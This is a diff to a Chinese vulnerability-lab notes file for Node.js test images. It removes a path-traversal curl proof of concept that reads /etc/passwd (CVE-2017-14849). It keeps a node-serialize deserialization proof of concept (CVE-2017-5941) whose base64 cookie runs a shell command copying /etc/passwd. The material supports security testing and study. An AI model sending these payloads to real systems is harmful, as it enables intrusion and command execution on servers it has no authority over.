@@ -1,19 +1,3 @@
-### nodejs 8.5 normalize 路径解析错误漏洞
-
-测试镜像
-
-* src/node-express/4.13.1/
-
-参考文章
-
-* [Node.js CVE-2017-14849 漏洞分析](https://security.tencent.com/index.php/blog/msg/121)
-
-Poc - 保证两边的 `/../` 数量一样
-
-```
-curl 127.0.0.1/js/../../../../../../a/../../../../../../etc/passwd
-```
-
 ### CVE-2017-5941 - node-serialize 0.0.4 unserialize eval() 漏洞
 
 测试镜像
@@ -33,4 +17,3 @@ Poc
 ```
 curl 127.0.0.1 -H "Cookie: profile=eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCkge1xuICAgIHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCdjcCAvZXRjL3Bhc3N3ZCAvdG1wJywgZnVuY3Rpb24oZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7XG4gICAgXHQvLyByZXMg5a+56LGh6KKr6ZqU56a75LqG77yM6ZyA6KaB5YaN56CU56m25LiL77yM5omA5Lul5peg5rOV55u05o6l5Zue5pi+XG4gICAgXHQvLyByZXMuc2VuZChcInN0ZG91dD1cIiwgc3Rkb3V0KVxuICAgIFx0Ly8gcmVzLnNlbmQoXCJzdGRlcnI9XCIsIHN0ZGVycilcbiAgICB9KVxuICB9KCkifQ%3D="
 ```
-
